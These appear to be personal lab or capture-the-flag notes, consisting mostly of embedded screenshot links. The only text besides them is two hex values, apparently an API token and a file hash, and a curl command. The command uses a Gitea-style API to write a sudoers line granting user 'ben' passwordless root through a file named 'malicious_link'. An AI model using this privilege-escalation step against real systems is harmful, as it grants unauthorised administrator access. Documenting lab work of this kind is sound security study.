

![[Pasted image 20260818193612.png|281]]





![[Pasted image 20260817084104.png]]



![[Pasted image 20260817084133.png]]



![[Pasted image 20260817085301.png]]



![[Pasted image 20260817143626.png]]



![[Pasted image 20260817143554.png]]



![[Pasted image 20260817143606.png]]



![[Pasted image 20260817143734.png]]




![[Pasted image 20260817144730.png]]



![[Pasted image 20260817144645.png]]


![[Pasted image 20260817144702.png]]



![[Pasted image 20260817213237.png]]



![[Pasted image 20260817213225.png]]




![[Pasted image 20260817213306.png]]



![[Pasted image 20260817222245.png]]




4c883a228d6ef8f0449792b08e65ec1a3dbb725a


![[Pasted image 20260817222318.png]]


af61034fa349f6a1038e549e9893721da4b984dd


![[Pasted image 20260817222341.png]]


curl -X PUT "http://127.0.0.1:8080/api/v1/repos/thunder/exploit/contents/malicious_link" \
     -H "Authorization: token 4c883a228d6ef8f0449792b08e65ec1a3dbb725a" \
     -H "Content-Type: application/json" \
     -d '{
         "message": "Add ben to sudoers",
         "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==",
         "sha": "af61034fa349f6a1038e549e9893721da4b984dd"
     }'



![[Pasted image 20260817222406.png]]



![[Pasted image 20260817222424.png]]



